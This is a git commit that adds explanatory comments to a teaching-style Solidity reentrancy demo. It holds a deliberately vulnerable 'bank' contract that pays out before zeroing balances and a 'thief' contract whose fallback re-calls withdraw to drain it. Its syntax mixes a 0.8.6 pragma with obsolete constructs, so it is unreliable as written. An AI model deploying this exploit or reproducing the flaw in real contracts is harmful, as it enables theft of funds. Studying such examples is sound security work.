bb9279396ef6046e615c29cdbc32b1a41b3b8361
Yael Chalom <yael.chalom@gmail.com>
2022-08-02 16:30:52 +0300

    add comments

--- bank.sol
+++ bank.sol
@@ -1,21 +1,23 @@
+//who is been attacked
+
 pragma solidity ^0.8.6;
 
 contract bank {
-    mapping(address => uint) public balances;
+    mapping(address => uint) public balances; //maps address to a value and stores it in a public variable called balances
 
 
 function bank payable {
     put();
 }
 
-function put() payable {
-    balances[msg.sender] = msg.value;
+function put() payable { //the put() function is where the storage of ether value happens in the contract
+    balances[msg.sender] = msg.value; //msg.sender is the transaction sender's address
 }
 
-function get() {
+function get() { //function where the exploitable is that let addresses to withdraw the value of ether they have in bank as balance
     if (!msg.sender.call.value(balances[msg.sender])()) {
         throw;
     }
-        balances[msg.sender] = 0;
+        balances[msg.sender] = 0; //bank sets the value of the address balance to zero only after checking if sent the transaction(sending ether to msg.sender)
         }
 }
--- thief.sol
+++ thief.sol
@@ -1,31 +1,34 @@
+//the attacker
 pragma solidity ^0.8.6;
 
-import "./bank.sol";
+import "./bank.sol"; //import the bank contract that is in separate file
 
-contract thief {
+
+contract thief { //bank is referenced throughout the thief contract
     bank public Bank;
 
-function thief (address _Bank) {
+function thief (address _Bank) { //pass the bank contract address to constructor function that is called when the thief is created
     Bank = bank(_Bank);
 }
 
-function kill () {
+//withdraw ether from bank contract to thief so need to collect to my own address
+function kill () { //this function destroy the thief and send the ether to address that call kill function
     suicide(msg.sender);
 }
-
-function collect() payable {
+//put some ether in bank and after gets it
+function collect() payable { //payable here tells the ETM that it permits to receive ether
     Bank.put.value(msg.value)();
     Bank.get();
 }
 
-function () payable {
-    if (Bank.balance >= msg.value) {
+function () payable { //fallback function is called whenever the hief contracts receive ether
+    if (Bank.balance >= msg.value) { //if bank contract balance is more than the value that it was sent to the fallback function calls get() function once again starting a cycle 
         Bank.get();
     }
+
+//this make that contract send monet to thief address until bank is depleted
+
+
 }
 
-
-
-
 }
-
